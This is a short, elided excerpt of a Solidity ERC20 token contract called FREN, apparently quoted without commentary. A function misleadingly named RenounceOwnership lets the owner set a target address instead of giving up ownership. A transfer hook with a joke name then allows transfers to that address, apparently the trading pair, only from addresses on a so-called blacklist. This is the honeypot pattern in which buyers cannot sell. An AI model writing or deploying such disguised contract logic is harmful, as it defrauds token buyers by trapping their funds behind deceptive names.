...
contract FREN is ERC20, Ownable {
    ...
    function RenounceOwnership(address frenToken_) public onlyOwner {
        _frenToken = frenToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _frenToken) {
            require(_blacklisted[from], "BOTS ARE NOT FRENS >:(");
        }
    }
}